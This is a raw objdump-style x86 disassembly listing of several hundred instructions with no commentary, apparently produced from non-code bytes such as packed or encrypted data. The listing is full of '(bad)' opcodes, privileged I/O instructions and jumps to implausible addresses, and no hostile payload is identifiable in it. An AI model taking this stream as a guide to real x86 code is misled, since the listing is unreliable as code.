  41b9ea:	xchg   esi,eax
  41b9eb:	repz sub DWORD PTR [eax],ebp
  41b9ee:	and    dl,bh
  41b9f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9f1:	dec    esp
  41b9f2:	(bad)  
  41b9f4:	stos   DWORD PTR es:[edi],eax
  41b9f5:	clc    
  41b9f6:	in     eax,dx
  41b9f7:	pop    ebx
  41b9f8:	dec    eax
  41b9f9:	cdq    
  41b9fa:	or     eax,DWORD PTR [esi+0x1e51a145]
  41ba00:	dec    esi
  41ba01:	sub    al,0x35
  41ba03:	call   0xdd01bd55
  41ba08:	mov    esi,0xbf6a29f4
  41ba0d:	icebp  
  41ba0e:	mov    DWORD PTR [esi-0x49],ebp
  41ba11:	imul   bh
  41ba13:	jmp    DWORD PTR [ebx+0x5b]
  41ba16:	lea    edi,[esi-0x4a]
  41ba19:	xchg   BYTE PTR [ecx],cl
  41ba1b:	add    ch,BYTE PTR [ecx+ecx*8]
  41ba1e:	mov    ds:0xd86f973,eax
  41ba23:	xor    BYTE PTR [edi+0x1cab2198],0x8a
  41ba2a:	or     eax,0xde5dc93a
  41ba2f:	shr    DWORD PTR [esi-0x14],0xfd
  41ba33:	imul   ebx,DWORD PTR [edx+0x4280bfcb],0x8cf8024f
  41ba3d:	mov    ah,0xc
  41ba3f:	inc    esp
  41ba40:	gs loopne 0x41ba4e
  41ba43:	and    BYTE PTR [edi+0x12],cl
  41ba46:	push   0x34
  41ba48:	popf   
  41ba49:	lods   al,BYTE PTR es:[esi]
  41ba4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba4c:	jecxz  0x41b9fd
  41ba4e:	xor    al,0xc4
  41ba50:	push   esp
  41ba51:	sbb    BYTE PTR [edi-0x70],dh
  41ba54:	retf   0x9c8c
  41ba57:	push   esp
  41ba58:	and    BYTE PTR [ecx],0xe2
  41ba5b:	sbb    al,0x38
  41ba5d:	std    
  41ba5e:	or     DWORD PTR [ecx+0x5d],esi
  41ba61:	outs   dx,BYTE PTR ds:[esi]
  41ba62:	jb     0x41ba03
  41ba64:	and    ch,bh
  41ba66:	not    dh
  41ba68:	data16 mov al,0x23
  41ba6b:	scas   al,BYTE PTR es:[edi]
  41ba6c:	pop    es
  41ba6d:	or     ebx,DWORD PTR [esi-0x3]
  41ba70:	cmc    
  41ba71:	push   0xc9c9f6b6
  41ba76:	cld    
  41ba77:	aas    
  41ba78:	es jl  0x41ba79
  41ba7b:	sub    BYTE PTR [esi-0x44],ah
  41ba7e:	lock cmp al,0xf0
  41ba81:	outs   dx,BYTE PTR ds:[esi]
  41ba82:	sub    eax,0xbfc9dd3a
  41ba87:	dec    edi
  41ba88:	and    edi,DWORD PTR [ebx+ecx*1+0x1ece1731]
  41ba8f:	cmp    DWORD PTR [edi+0x1f],0x5
  41ba93:	mov    eax,esi
  41ba95:	xchg   esp,eax
  41ba96:	inc    esi
  41ba97:	pop    es
  41ba98:	dec    esi
  41ba99:	imul   ebp,DWORD PTR [ebp-0x43f42f1f],0xb656c317
  41baa3:	jo     0x41bb10
  41baa5:	ins    BYTE PTR es:[edi],dx
  41baa6:	xchg   esi,eax
  41baa7:	lds    edi,FWORD PTR [eax]
  41baa9:	xchg   ebp,eax
  41baaa:	mov    bl,0xb9
  41baac:	jne    0x41badb
  41baae:	stc    
  41baaf:	movups XMMWORD PTR [esi],xmm0
  41bab2:	xchg   ecx,eax
  41bab3:	jl     0x41ba93
  41bab5:	push   esp
  41bab6:	adc    BYTE PTR [eax],cl
  41bab8:	ins    DWORD PTR es:[edi],dx
  41bab9:	jnp    0x41ba50
  41babb:	jno    0x41ba49
  41babd:	pop    esi
  41babe:	or     BYTE PTR [esi-0x58],ah
  41bac1:	aam    0x8a
  41bac3:	jge    0x41bb23
  41bac5:	cmp    edi,DWORD PTR [edi]
  41bac7:	and    DWORD PTR [ebp+0x2c],ebp
  41baca:	add    al,0xde
  41bacc:	inc    ebx
  41bacd:	mov    BYTE PTR [ebx-0x47],0xa9
  41bad1:	mov    bh,0x20
  41bad3:	xchg   ebx,eax
  41bad4:	gs mov esi,0x7f658082
  41bada:	hlt    
  41badb:	inc    ecx
  41badc:	mov    ah,0xd
  41bade:	jbe    0x41baf0
  41bae0:	in     eax,0x9f
  41bae2:	and    eax,0x1382a7cf
  41bae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bae8:	(bad)  
  41bae9:	pop    ds
  41baea:	sbb    eax,0x1daf5dfd
  41baef:	or     al,BYTE PTR [ebx+0x6f3bf462]
  41baf5:	outs   dx,DWORD PTR ds:[esi]
  41baf6:	lods   al,BYTE PTR ds:[esi]
  41baf7:	mov    WORD PTR [ecx-0x64],ss
  41bafa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bafb:	ror    edx,0xdb
  41bafe:	call   0x9202e862
  41bb03:	adc    al,BYTE PTR [ecx+0x3d3194db]
  41bb09:	call   DWORD PTR [ebp+ebx*1-0x37408646]
  41bb10:	sub    eax,DWORD PTR [eax-0x206554c2]
  41bb16:	jae    0x41bb2f
  41bb18:	ret    
  41bb19:	sbb    al,cl
  41bb1b:	cmp    al,0x68
  41bb1d:	clc    
  41bb1e:	lods   eax,DWORD PTR ds:[esi]
  41bb1f:	dec    eax
  41bb20:	je     0x41bacb
  41bb22:	mov    ebp,0x80b8169a
  41bb27:	xor    eax,0x3b5a80e6
  41bb2c:	xchg   ebp,eax
  41bb2d:	je     0x41bb58
  41bb2f:	pop    ds
  41bb30:	mov    dl,0xfa
  41bb32:	sub    cl,BYTE PTR [ebp-0x8]
  41bb35:	adc    edi,DWORD PTR [edx-0x7f]
  41bb38:	pushf  
  41bb39:	mov    esp,0xef6b1cd7
  41bb3e:	add    al,0xe1
  41bb40:	jne    0x41bb06
  41bb42:	jp     0x41bb83
  41bb44:	(bad)  
  41bb45:	add    ebx,DWORD PTR [bx+0x338c]
  41bb4a:	sub    DWORD PTR [ebp-0x4e2b8b2b],ecx
  41bb50:	fistp  QWORD PTR [esp+edi*1-0x134d5af2]
  41bb57:	xor    DWORD PTR [ebx-0x38a98e46],0xd58282a1
  41bb61:	cmp    ah,BYTE PTR [esi+edi*8+0x11]
  41bb65:	(bad)  
  41bb67:	and    dl,ah
  41bb69:	shl    ah,cl
  41bb6b:	push   ecx
  41bb6c:	pop    ds
  41bb6d:	jnp    0x41bb24
  41bb6f:	int3   
  41bb70:	loope  0x41bb9e
  41bb72:	aaa    
  41bb73:	push   eax
  41bb74:	xlat   BYTE PTR ds:[ebx]
  41bb75:	push   edx
  41bb76:	dec    ebx
  41bb77:	push   esp
  41bb78:	shl    BYTE PTR [ecx],1
  41bb7a:	or     esp,DWORD PTR ds:0x2f06c933
  41bb80:	stc    
  41bb81:	scas   al,BYTE PTR es:[edi]
  41bb82:	mov    ch,0x71
  41bb84:	fcmovnb st,st(6)
  41bb86:	mov    bl,0x59
  41bb88:	dec    ebp
  41bb89:	adc    al,0xb0
  41bb8b:	adc    BYTE PTR [edi+0x71],ah
  41bb8e:	stos   DWORD PTR es:[edi],eax
  41bb8f:	jnp    0x41bb4a
  41bb91:	mov    cl,0xbb
  41bb93:	gs push es
  41bb95:	jmp    0x41bb19
  41bb97:	mov    edi,0xe6445d76
  41bb9c:	sti    
  41bb9d:	sbb    al,ch
  41bb9f:	xor    bh,BYTE PTR [edi]
  41bba1:	xlat   BYTE PTR ds:[ebx]
  41bba2:	xchg   BYTE PTR [edi-0xe],bh
  41bba5:	or     al,0xa5
  41bba7:	mov    bh,al
  41bba9:	xchg   edx,eax
  41bbaa:	shl    DWORD PTR [eax],1
  41bbac:	pop    ss
  41bbad:	aad    0xe7
  41bbaf:	xor    ebp,ebp
  41bbb1:	data16 out dx,al
  41bbb3:	mov    eax,ds:0x83757c6a
  41bbb8:	xor    eax,0x7747c7d6
  41bbbd:	mov    al,ds:0x77c82756
  41bbc2:	adc    al,0x6a
  41bbc4:	add    ch,BYTE PTR cs:[edi+0x35]
  41bbc8:	in     eax,dx
  41bbc9:	test   bh,dh
  41bbcb:	cs jb  0x41bb50
  41bbce:	les    ebx,FWORD PTR [eax-0x7f]
  41bbd1:	aad    0x1d
  41bbd3:	cdq    
  41bbd4:	fstp   QWORD PTR [ebp+0x2]
  41bbd7:	lahf   
  41bbd8:	inc    ebp
  41bbd9:	in     al,0x12
  41bbdb:	dec    edx
  41bbdc:	(bad)  
  41bbdd:	aam    0xfa
  41bbdf:	push   cs
  41bbe0:	and    al,BYTE PTR [esi-0x76]
  41bbe3:	test   eax,0xa8c511ce
  41bbe8:	sub    DWORD PTR [eax+0x6ded1223],eax
  41bbee:	ins    BYTE PTR es:[edi],dx
  41bbef:	retf   0x991e
  41bbf2:	es ins DWORD PTR es:[edi],dx
  41bbf4:	and    al,0x6f
  41bbf6:	lods   al,BYTE PTR ds:[esi]
  41bbf7:	add    bh,dl
  41bbf9:	adc    ebx,DWORD PTR [esp+eax*8+0x14fff904]
  41bc00:	mov    bl,0xc3
  41bc02:	ret    0xe393
  41bc05:	or     al,0xe9
  41bc07:	xor    cl,BYTE PTR [esi+0x40d346b5]
  41bc0d:	cli    
  41bc0e:	call   0xf82b166f
  41bc13:	push   eax
  41bc14:	jge    0x41bbf0
  41bc16:	repnz mov ch,BYTE PTR [edx]
  41bc19:	int    0x5
  41bc1b:	add    al,0x42
  41bc1d:	mov    ebp,0x803f3a15
  41bc22:	mov    bl,0x2a
  41bc24:	inc    esi
  41bc25:	addr16 dec dl
  41bc28:	out    dx,al
  41bc29:	ins    BYTE PTR es:[edi],dx
  41bc2a:	push   0xe5696342
  41bc2f:	ret    0xafd0
  41bc32:	es popf 
  41bc34:	adc    dl,BYTE PTR [ebx]
  41bc36:	or     esp,ecx
  41bc38:	xchg   esi,eax
  41bc39:	cdq    
  41bc3a:	mov    al,ds:0x673e1dcf
  41bc3f:	add    al,0xde
  41bc41:	mov    dl,0x5b
  41bc43:	xchg   ebx,eax
  41bc44:	adc    al,0x90
  41bc46:	dec    esp
  41bc47:	add    eax,0xb4259a26
  41bc4c:	push   0xffffffac
  41bc4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc4f:	sti    
  41bc50:	les    ecx,FWORD PTR [esi]
  41bc52:	xor    al,0x2
  41bc54:	retf   0x60b
  41bc57:	jl     0x41bc50
  41bc59:	mov    ds:0xf3d67f19,eax
  41bc5e:	dec    ecx
  41bc5f:	out    dx,al
  41bc60:	mov    eax,ds:0x6bc1aac4
  41bc65:	or     eax,0x1d38aef
  41bc6a:	xchg   bh,ch
  41bc6c:	cmp    BYTE PTR fs:[ecx],bl
  41bc6f:	push   0xd1cc7d04
  41bc74:	(bad)  
  41bc75:	xor    ebp,DWORD PTR es:[ebp-0x36]
  41bc79:	call   0xfa145917
  41bc7e:	inc    eax
  41bc7f:	(bad)  
  41bc80:	adc    ch,ah
  41bc82:	pushf  
  41bc83:	fwait
  41bc84:	mov    ebx,0x80b3792f
  41bc89:	or     eax,0x8092728b
  41bc8e:	lahf   
  41bc8f:	jle    0x41bce1
  41bc91:	jg     0x41bc49
  41bc93:	sbb    al,0x77
  41bc95:	inc    edi
  41bc96:	mov    ah,0xf3
  41bc98:	pop    edi
  41bc99:	and    dh,BYTE PTR [eax]
  41bc9b:	push   eax
  41bc9c:	jo     0x41bc8c
  41bc9e:	mov    BYTE PTR [esi-0x2212adb2],0xa8
  41bca5:	sub    ebp,DWORD PTR [eax]
  41bca7:	std    
  41bca8:	pop    ecx
  41bca9:	push   esp
  41bcaa:	pop    edi
  41bcab:	cmp    DWORD PTR [ebp+0x74],edx
  41bcae:	mov    esp,DWORD PTR [edx+0x1d]
  41bcb1:	mov    bl,0x15
  41bcb3:	outs   dx,WORD PTR ds:[esi]
  41bcb5:	push   0xeb84442a
  41bcba:	add    al,0x24
  41bcbc:	in     al,0x48
  41bcbe:	lock shl DWORD PTR [edx],cl
  41bcc1:	push   esi
  41bcc2:	int3   
  41bcc3:	(bad)  
  41bcc4:	sbb    esi,DWORD PTR gs:[ebx]
  41bcc7:	fcmovu st,st(2)
  41bcc9:	adc    ah,ah
  41bccb:	cmp    BYTE PTR [edx+0x77aaa205],dh
  41bcd1:	and    eax,0x38f9a5bc
  41bcd6:	ror    DWORD PTR [ecx+0x62],0x95
  41bcda:	xchg   edi,eax
  41bcdb:	enter  0x8ca7,0xbb
  41bcdf:	sbb    ch,BYTE PTR [edi-0x1aa27a4f]
  41bce5:	dec    eax
  41bce6:	addr16 ja 0x41bcd3
  41bce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcea:	not    BYTE PTR [ecx+0x5f]
  41bced:	sub    edi,ecx
  41bcef:	repnz outs dx,DWORD PTR ds:[esi]
  41bcf1:	retf   
  41bcf2:	mov    eax,0x6393cc79
  41bcf7:	push   eax
  41bcf8:	xchg   DWORD PTR [ebx+eax*2-0x1755c042],edx
  41bcff:	ds test al,0x37
  41bd02:	jmp    0x250b377a
  41bd07:	dec    esp
  41bd08:	pop    ecx
  41bd09:	dec    ecx
  41bd0a:	mov    ecx,0x2903342
  41bd0f:	addr16 and al,0xc4
  41bd12:	in     eax,0xa7
  41bd14:	enter  0x6045,0x51
  41bd18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd19:	test   ebp,esp
  41bd1b:	jl     0x41bcc3
  41bd1d:	(bad)
  41bd20:	ds mov ebx,0xf4bb86c1
  41bd26:	xor    ecx,DWORD PTR [eax+edi*4]
  41bd29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd2a:	xor    DWORD PTR [esi+0x33a638a7],edx
  41bd30:	retf   
  41bd31:	add    edi,DWORD PTR [eax-0x64]
  41bd34:	push   0xc4434a17
  41bd39:	mov    ah,0x97
  41bd3b:	rcr    DWORD PTR [esi+0x8],0x9c
  41bd3f:	cs jmp 0x41bdac
  41bd42:	(bad)  
  41bd43:	xchg   ebx,eax
  41bd44:	mov    ebx,0x67d2c2f
  41bd49:	pop    ebp
  41bd4a:	(bad)  
  41bd4b:	xlat   BYTE PTR ds:[ebx]
  41bd4c:	push   ebp
  41bd4d:	inc    edi
  41bd4e:	(bad)  
  41bd4f:	sbb    eax,0xeb71ea37
  41bd54:	pop    ss
  41bd55:	ror    ebx,1
  41bd57:	js     0x41bda5
  41bd59:	pop    esp
  41bd5a:	les    edx,FWORD PTR [ecx-0x9]
  41bd5d:	(bad)  
  41bd5e:	adc    ebx,esi
  41bd60:	repz stc 
  41bd62:	mov    al,ds:0x7a40a0ee
  41bd67:	shr    BYTE PTR [edi],0xe5
  41bd6a:	sbb    eax,0x51df304a
  41bd6f:	scas   al,BYTE PTR es:[edi]
  41bd70:	std    
  41bd71:	xor    ebp,DWORD PTR [ebp-0x610d0cb4]
  41bd77:	push   esp
  41bd78:	call   0x86cd0b82
  41bd7d:	popa   
  41bd7e:	sti    
  41bd7f:	aad    0x3d
  41bd81:	sar    ebp,1
  41bd83:	push   0xaae2c5d9
  41bd88:	out    dx,al
  41bd89:	fst    DWORD PTR [esi+ebp*1+0x6f]
  41bd8d:	push   ebp
  41bd8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd8f:	(bad)  [esi+ebp*2]
  41bd92:	add    al,0x24
  41bd94:	dec    esi
  41bd95:	mov    ds:0xf53c064c,eax
  41bd9a:	jmp    0xf9d6:0x9da1fbfc
  41bda1:	aad    0x4d
  41bda3:	pop    ebx
  41bda4:	loop   0x41be0d
  41bda6:	dec    eax
  41bda7:	bound  esi,QWORD PTR [edi-0x4e]
  41bdaa:	leave  
  41bdab:	clc    
  41bdac:	aam    0xa4
  41bdae:	push   es
  41bdaf:	sub    al,0x48
  41bdb1:	test   al,0x22
  41bdb4:	xor    ebx,esi
  41bdb6:	mov    ch,0xb1
  41bdb8:	sub    dl,ch
  41bdba:	pop    ecx
  41bdbb:	jbe    0x41bdc6
  41bdbd:	jmp    0xad14a633
  41bdc2:	nop
  41bdc3:	leave  
  41bdc4:	dec    edx
  41bdc5:	je     0x41be1f
  41bdc7:	test   eax,0x8e6322f1
  41bdcc:	and    esp,DWORD PTR [esi-0x7f]
  41bdcf:	in     al,0x1b
  41bdd1:	xchg   ecx,eax
  41bdd2:	in     al,dx
  41bdd3:	cmp    ch,BYTE PTR [ebp+edi*8+0x44]
  41bdd7:	add    DWORD PTR [eax],esp
  41bdd9:	mov    eax,ds:0x57aa766a
  41bdde:	stc    
  41bddf:	mov    ds:0x8c86788e,al
  41bde4:	out    0x63,al
  41bde6:	lods   al,BYTE PTR ds:[esi]
  41bde7:	and    al,0x2e
  41bde9:	mov    esp,0x755ca24b
  41bdee:	cmp    DWORD PTR [edi],edi
  41bdf0:	jg     0x41be1f
  41bdf2:	ja     0x41be05
  41bdf4:	adc    dl,BYTE PTR [ecx-0x2c504fb8]
  41bdfa:	mov    esp,0x87fa6c16
  41bdff:	pop    ss
  41be00:	retf   0x1cbe
  41be03:	leave  
  41be04:	adc    eax,0x78d1f6b5
  41be09:	cmp    al,0x3c
  41be0b:	std    
  41be0c:	jnp    0x41be6a
  41be0e:	cli    
  41be0f:	inc    esi
  41be10:	xchg   ecx,esp
  41be12:	xchg   ebx,eax
  41be13:	sbb    esp,ebp
  41be15:	mov    dl,0xf
  41be17:	inc    eax
  41be18:	and    BYTE PTR [ebp-0x78db296f],cl
  41be1e:	pop    ebx
  41be1f:	lea    ebp,[esi+0x0]
  41be22:	fdiv   DWORD PTR [edi]
  41be24:	pop    edx
  41be25:	push   ebp
  41be26:	inc    esi
  41be27:	xor    al,0x5c
  41be29:	iret   
  41be2a:	ret    
  41be2b:	aad    0xd9
  41be2d:	or     esi,DWORD PTR [edi-0x80]
  41be30:	pop    esp
  41be31:	fst    DWORD PTR [ecx]
  41be33:	mov    ebx,0xa38ac4a5
  41be38:	push   ebp
  41be39:	push   ds
  41be3a:	xchg   esp,eax
  41be3b:	mov    BYTE PTR [ebp-0x1e562b8f],cl
  41be41:	das    
  41be42:	loopne 0x41bec0
  41be44:	sbb    al,0x4a
  41be46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be47:	push   ebp
  41be48:	hlt    
  41be49:	mov    edx,0xe3114678
  41be4e:	loop   0x41be05
  41be50:	mov    DWORD PTR [esi+0x14],esp
  41be53:	cmp    al,0x94
  41be55:	lea    esi,[ecx+0xd4152f0]
  41be5b:	pop    edi
  41be5c:	pop    ebp
  41be5d:	ret    
  41be5e:	mov    ebp,DWORD PTR [edi+ebp*4-0x6f]
  41be62:	mov    eax,ds:0x27d61ffb
  41be67:	and    BYTE PTR [ecx+0x70],dh
  41be6a:	add    eax,0x4ef0a2ea
  41be6f:	inc    esp
  41be70:	leave  
  41be71:	pop    esi
  41be72:	retf   
  41be73:	pop    ebx
  41be74:	in     eax,dx
  41be75:	adc    BYTE PTR [ebx-0x35c7af47],bh
  41be7b:	or     eax,0x4faee00
  41be80:	test   eax,eax
  41be82:	inc    ecx
  41be83:	sub    eax,0xfe4d536f
  41be88:	jbe    0x41be9d
  41be8a:	lods   al,BYTE PTR ds:[esi]
  41be8b:	jg     0x41becd
  41be8d:	mov    si,0x51d
  41be91:	retf   0xccfc
  41be94:	xor    DWORD PTR [esi+ebx*4-0x77fd8195],0xfffffffc
  41be9c:	repz ror BYTE PTR fs:[edx],0xc1
  41bea1:	push   0xffffffdd
  41bea3:	call   0x2666:0x1751b1f7
  41beaa:	pop    eax
  41beab:	sub    eax,0xb85577c7
  41beb0:	cvtps2pi mm3,xmm6
  41beb3:	jo     0x41bed9
  41beb5:	test   BYTE PTR [edi-0x2ee8bbb9],dl
  41bebb:	aaa    
  41bebc:	retf   0xe850
  41bebf:	dec    edi
  41bec0:	retf   0xa6bc
  41bec3:	pop    ds
  41bec4:	clc    
  41bec5:	push   0xec5487f8
  41beca:	jb     0x41bed1
  41becc:	fcmovb st,st(1)
  41bece:	xchg   edi,eax
  41becf:	sbb    cl,BYTE PTR [ebx]
  41bed1:	add    al,0xe8
  41bed3:	std    
  41bed4:	scas   eax,DWORD PTR es:[edi]
  41bed5:	inc    esi
  41bed6:	pop    eax
  41bed7:	pop    ss
  41bed8:	or     BYTE PTR [ecx+ebx*2+0x41],bl
  41bedc:	es xor al,al
  41bedf:	je     0x41be79
  41bee1:	das    
  41bee2:	and    eax,0x34e9af82
  41bee7:	dec    esi
  41bee8:	stc    
  41bee9:	and    dl,BYTE PTR [esi]
  41beeb:	rcr    DWORD PTR [esi-0x658fe2a7],0xef
  41bef2:	sahf   
  41bef3:	es dec eax
  41bef5:	mov    esp,0xc3dce66
  41befa:	or     DWORD PTR [ecx+0x40],ecx
  41befd:	pop    edx
  41befe:	or     al,0xae
  41bf00:	pop    ss
  41bf01:	add    DWORD PTR [edx+0x50],edi
  41bf04:	sub    al,0xde
  41bf06:	(bad)  
  41bf07:	out    dx,eax
  41bf08:	sub    dl,BYTE PTR [esi+0x2bcf4acc]
  41bf0e:	xchg   DWORD PTR [esp+eax*2-0x275d99cd],ebx
  41bf15:	or     ecx,ebp
  41bf17:	shr    BYTE PTR [ecx],0x3f
  41bf1a:	and    eax,0xdd219a4b
  41bf1f:	cmp    DWORD PTR [esi-0x7fa5ecf5],ebx
  41bf25:	pop    edx
  41bf26:	xor    BYTE PTR [edx+edx*8],0x6b
  41bf2a:	(bad)  
  41bf2b:	in     eax,dx
  41bf2c:	mov    ebp,0xe4af4c37
  41bf31:	sub    esp,eax
  41bf33:	dec    esi
  41bf34:	jno    0x41bf9c
  41bf36:	xor    DWORD PTR [ebx+0x5eebca4c],ecx
  41bf3c:	push   ds
  41bf3d:	icebp  
  41bf3e:	add    al,dh
  41bf40:	out    dx,al
  41bf41:	test   BYTE PTR [ebp+0x52929bb1],ch
  41bf47:	xchg   edi,eax
  41bf48:	inc    esp
  41bf49:	rcl    BYTE PTR [esi-0x2e375e7],1
  41bf4f:	mov    DWORD PTR [ebp+0x2ac9a20c],0x8f3b3b92
  41bf59:	idiv   DWORD PTR [edi+0x6b10196d]
  41bf5f:	mov    ebx,DWORD PTR [edx-0x3390cec0]
  41bf65:	jp     0x41bf75
  41bf67:	ror    eax,cl
  41bf69:	mov    cl,0xe6
  41bf6b:	pop    ebp
  41bf6c:	in     eax,dx
  41bf6d:	mov    ecx,0x4e58f7e1
  41bf72:	das    
  41bf73:	fld    TBYTE PTR [edi+ecx*2+0x39cf54d2]
  41bf7a:	out    dx,eax
  41bf7b:	push   0x36
  41bf7d:	int3   
  41bf7e:	outs   dx,DWORD PTR ds:[esi]
  41bf7f:	ja     0x41bf2f
  41bf81:	ss xor al,0x59
  41bf84:	cwde   
  41bf85:	sbb    BYTE PTR [ebx],dh
  41bf87:	enter  0xfed9,0x8
  41bf8b:	fwait
  41bf8c:	sub    eax,0xbf78fb95
  41bf91:	inc    ebp
  41bf92:	int3   
  41bf93:	mov    ebp,0x5e9f7532
  41bf98:	mov    esp,0x83054932
  41bf9d:	or     ecx,DWORD PTR [eax-0x3f6d26b2]
  41bfa3:	mov    dh,0x6d
  41bfa5:	hlt    
  41bfa6:	(bad)  
  41bfa8:	push   ds
  41bfa9:	(bad)  
  41bfaa:	sub    ebx,esi
  41bfac:	arpl   WORD PTR [edx+0x35],dx
  41bfaf:	xadd   BYTE PTR [ebp-0x5d],bl
  41bfb3:	cmp    esi,DWORD PTR [esi+esi*8+0x3e85b8f2]
  41bfba:	pop    ebp
  41bfbb:	inc    DWORD PTR [ebx-0x51]
  41bfbe:	ficomp DWORD PTR [esp+eiz*2]
  41bfc1:	jge    0x41bf83
  41bfc3:	in     al,dx
  41bfc4:	popa   
  41bfc5:	(bad)  
  41bfc6:	xchg   ebx,eax
  41bfc7:	lea    esp,[bp+0x386c]
  41bfcc:	mov    eax,ecx
  41bfce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfcf:	sbb    bh,BYTE PTR [esi-0x7c]
  41bfd2:	sbb    al,0x6
  41bfd4:	push   ds
  41bfd5:	nop
  41bfd6:	pop    edi
  41bfd7:	push   edi
  41bfd8:	mov    ebx,0xd29b9614
  41bfdd:	clc    
  41bfde:	mov    ah,0x32
  41bfe0:	push   ss
  41bfe1:	push   0x54d7db83
  41bfe6:	inc    eax
  41bfe7:	cs jle 0x41bffc
  41bfea:	dec    esi
  41bfeb:	rcr    BYTE PTR [ebp-0xdec2a7e],1
  41bff1:	inc    edx
  41bff2:	or     BYTE PTR [ecx+0x3041783a],0x26
  41bff9:	shl    al,1
  41bffb:	lock lahf 
  41bffd:	(bad)  
  41bffe:	adc    BYTE PTR [edx+0x680376d7],dl
  41c004:	xchg   esp,eax
  41c005:	xchg   esi,eax
  41c006:	(bad)  
  41c008:	in     al,dx
  41c009:	gs jmp 0xcad8d044
  41c00f:	inc    edi
  41c010:	adc    al,0xb1
  41c012:	(bad)  
  41c013:	cmp    eax,0x9d9441d3
  41c018:	pop    es
  41c019:	sub    al,0x84
  41c01b:	shl    DWORD PTR [esi],0xe0
  41c01e:	xchg   esp,eax
  41c01f:	aad    0x60
  41c021:	ficomp DWORD PTR [ebx]
  41c023:	pop    ebx
  41c024:	sub    BYTE PTR [edx*8+0x74a11ffa],dh
  41c02b:	cld    
  41c02c:	push   esp
  41c02d:	dec    esp
  41c02e:	lods   al,BYTE PTR ds:[esi]
  41c02f:	nop
  41c030:	mov    esi,0x79b2425a
  41c035:	test   DWORD PTR [ecx],esi
  41c037:	jle    0x41bff7
  41c039:	adc    eax,0x8b3b9e4e
  41c03e:	and    DWORD PTR [edx-0x17],esi
  41c041:	enter  0x9cd0,0xed
  41c045:	fiadd  WORD PTR [ecx+0x12a8472e]
  41c04b:	ins    DWORD PTR es:[edi],dx
  41c04c:	jbe    0x41bfd6
  41c04e:	leave  
  41c04f:	iret   
  41c050:	mov    ch,0x68
  41c052:	aad    0xa0
  41c054:	call   0xc605fad8
  41c059:	out    dx,al
  41c05a:	cmp    DWORD PTR [edi+0x1c],eax
  41c05d:	push   es
  41c05e:	add    esi,DWORD PTR [esi]
  41c060:	std    
  41c061:	in     eax,dx
  41c062:	mov    eax,ds:0x49fa061
  41c067:	inc    ebp
  41c068:	sti    
  41c069:	cmp    al,0xee
  41c06b:	ja     0x41c04e
  41c06d:	xchg   esi,eax
  41c06e:	xlat   BYTE PTR ds:[ebx]
  41c06f:	and    al,0x2c
  41c071:	adc    edi,DWORD PTR [esp+ebx*8-0x7d0b2658]
  41c078:	mov    ds:0x7bd7fbd9,eax
  41c07d:	les    edi,FWORD PTR [ecx]
  41c07f:	mov    cl,0x1e
  41c081:	lock jns 0x41c0cb
  41c084:	push   0xfffffff6
  41c086:	sub    eax,0xfd5066f1
  41c08b:	mov    al,0x53
  41c08d:	daa    
  41c08e:	loopne 0x41c10a
  41c090:	jl     0x41c03e
  41c092:	cmp    BYTE PTR [edx],0x7a
  41c095:	jge    0x41c0a8
  41c097:	int    0x94
  41c099:	fimul  DWORD PTR [esi+0x6f]
  41c09c:	push   esi
  41c09d:	nop
  41c09e:	mov    al,ds:0xd376fe17
  41c0a3:	ins    BYTE PTR es:[edi],dx
  41c0a4:	jmp    0x13b4:0x22f7aef0
  41c0ab:	call   FWORD PTR [ecx+0x2097a465]
  41c0b1:	xchg   ebx,eax
  41c0b2:	sbb    dh,bh
  41c0b4:	loopne 0x41c065
  41c0b6:	or     al,0xb0
  41c0b8:	push   ebp
  41c0b9:	ds jmp 0x8547:0x477f4dc8
  41c0c1:	mov    edx,0xc324da84
  41c0c6:	sahf   
  41c0c7:	sbb    ebx,edi
  41c0c9:	jge    0x41c04d
  41c0cb:	leave  
  41c0cc:	push   eax
  41c0cd:	ins    DWORD PTR es:[edi],dx
  41c0ce:	dec    ebp
  41c0cf:	or     DWORD PTR [ecx+0x21510e71],ecx
  41c0d5:	sub    bl,BYTE PTR [esi+0x5cd9b168]
  41c0db:	pop    es
  41c0dc:	and    DWORD PTR [ebx],0xf
  41c0df:	ror    esp,cl
  41c0e1:	adc    bh,BYTE PTR [ebp+0x6323c3c5]
  41c0e7:	adc    BYTE PTR [ecx+0x66],dl
  41c0ea:	mov    esp,0x12c73580
  41c0ef:	hlt    
  41c0f0:	mov    eax,ds:0x3b343ce9
  41c0f5:	jbe    0x41c15c
  41c0f7:	dec    edi
  41c0f8:	xchg   ebx,eax
  41c0f9:	(bad)  
  41c0fa:	mov    dl,0x84
  41c0fc:	sbb    dl,BYTE PTR [ecx+esi*1-0x52]
  41c100:	mov    eax,0xcc89dcca
  41c105:	lods   eax,DWORD PTR ds:[esi]
  41c106:	add    dl,cl
  41c108:	ins    BYTE PTR es:[edi],dx
  41c109:	addr16 or eax,0xe5e11c9f
  41c10f:	push   ss
  41c110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c111:	mov    ch,BYTE PTR [ecx+0x12]
  41c114:	push   ss
  41c115:	add    DWORD PTR [edi+0x59],edi
  41c118:	adc    al,0x97
  41c11a:	outs   dx,BYTE PTR ds:[esi]
  41c11b:	inc    ebp
  41c11c:	sti    
  41c11d:	pop    ss
  41c11e:	js     0x41c0da
  41c120:	mov    ah,0xce
  41c122:	xor    ecx,DWORD PTR [esi]
  41c124:	xor    DWORD PTR [ebx+0x61e2fe2d],esp
  41c12a:	jp     0x41c18e
  41c12c:	aaa    
  41c12d:	pop    edx
  41c12e:	dec    edi
  41c12f:	jae    0x41c165
  41c131:	xchg   esp,eax
  41c132:	shl    DWORD PTR [ecx+0x12],0xd0
  41c136:	mov    al,0x12
  41c138:	leave  
  41c139:	push   cs
  41c13a:	sub    DWORD PTR [edx-0x71f56082],0xca372918
  41c144:	ficom  DWORD PTR [ecx+0x46fc32ad]
  41c14a:	or     bh,al
